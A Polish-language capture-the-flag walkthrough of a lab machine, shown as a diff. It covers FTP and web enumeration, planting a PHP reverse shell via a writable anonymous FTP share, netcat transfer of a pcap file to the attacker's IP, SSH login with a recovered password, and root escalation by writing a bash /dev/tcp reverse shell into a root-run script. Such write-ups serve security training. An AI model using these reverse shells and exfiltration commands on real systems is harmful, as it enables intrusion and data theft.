@@ -1,0 +1,193 @@
+Umieszczenie skryptu odwrotnej powłoki php w katalogu ftp
+
+*Enumeracja za pomoca nmap:*
+```python
+sudo nmap -sC -sV 10.10.57.239
+
+Nmap scan report for 10.10.57.239
+Host is up (0.049s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.18.105.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Maintenance
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+*Z odczytu wynika iż możliwe jest anonimowe logowanie się przez FTP:*
+```python
+ftp 10.10.57.239
+login: anonymous
+password: anonymous
+ls -al
+```
+
+Udział FTP ma 1 katalog i 2 pliki. Pliki a mianowicie .test.log 
+i notice.txt nie zawiera niczego użytecznego, 
+ale katalog ftp ma uprawnienia do zapisu.
+
+Skanowanie nmapa pokazało usługę http na porcie 80.
+
+*W tym momencie dokonuję enumeracji katalogu w celu wyszukania ukrytych
+katalogów na serwerze www:*
+```python
+gobuster dir -u http://10.10.57.239 --wordlist /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.57.239
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/19 01:53:58 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/files                (Status: 301) [Size: 312] [--> http://10.10.57.239/files/]
+/index.html           (Status: 200) [Size: 808]                                 
+/server-status        (Status: 403) [Size: 277]                                 
+                                                                                
+===============================================================
+2022/09/19 01:54:25 Finished
+===============================================================
+```
+*Sprawdzam katalog /files w przeglądarce wpisując:*
+```python
+http://10.10.57.239/files
+```
+
+Widać pliki, które były na udziale ftp. Więc można spróbować umieścić 
+skrypt odwrotnej powłoki php w katalogu ftp, ponieważ miał uprawnienia 
+do zapisu i spróbować wykonać skrypt za pomocą usługi http.
+
+Najpierw należy stworzyć reverse shell php.
+
+*Teraz należy umieścić plik reverse shell na atakowanej maszynie:*
+```python
+ftp 10.10.57.239
+put reverse_shell.php
+```
+
+*Na Kali Linux:*
+```python
+nc nc -lnvp 1234
+```
+
+W tym momencie w przeglądarce należy uruchomić plik reverse_shell.php
+
+*W Kali Linux:*
+```python
+whoami
+```
+
+Okazuje się iż jestem użytkownikiem www-data
+
+*W celu utworzenia bardziej stabilnej powłoki:*
+```python
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+
+Po wykonaniu odwrotnej powłoki przez katalog /files/ftp 
+otrzymałiem powłokę.
+Można zauważyć katalog i plik należący do użytkownika www.data:
+recipe.txt:
+cat recipe.txt
+
+Treść pliku to:
+Someone asked what our main ingredient to our spice soup is today. 
+I figured I can't keep it a secret forever and told him it was love.
+
+W Katalogu /incidents znajduje sie plik o nazwie suspicious.pcapng.
+Teraz należy przenieść plik suspicious.pcapng.
+W tym momencie trzeba przenieść ten plik do mojego systemu za pomocą netcat. 
+
+*Kali Linux:*
+```python
+nc -lvnp 9999 > suspicious.pcapng
+```
+
+*Target:*
+```python
+nc 10.18.105.140 9999 < suspicious.pcapng
+```
+
+*W tym momencie można dokonać analizy pliku suspicious.pcapng*
+```python
+ettercap -T -r suspicious.pcapng
+```
+
+**Uzyskane hasło to** c4ntg3t3n0ughsp1c3
+
+W katalogu home widać iż istnieje użytkownik lennie, więc można
+sprawdzić czy uzyskane hasło będzie pasowało.
+
+
+*W tym momencie można się zalogowac na użytkowniku lennie:*
+```python
+ssh lennie@10.10.57.239
+password: c4ntg3t3n0ughsp1c3
+
+cat user.txt 
+``` 
+
+
+W Katalogu domowym widać interesujący katalog o nazwie scripts.
+Katalog ten jest własnością użytkownika root.
+
+```python
+cat planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+```
+
+W katalogu znajduje się skrypt planner.sh 
+(który jest wykonywany przez roota), 
+który nie jest zapisywalny przez bieżącego użytkownika, 
+ale wykonuje inny skrypt o nazwie */etc/print.sh* który jest zapisywalny 
+przez lennie.
+
+*Można więc spróbować umieścić odwrócony skrypt powłoki w /etc/print.sh:*
+```python
+cat > /etc/print.sh
+bash -i >& /dev/tcp/IP Kali Linux/6666 0>&1
+ctrl C
+```
+
+*Kali Linux:*
+```python
+nc -lnvp 6666
+whoami
+cat root.txt
+```
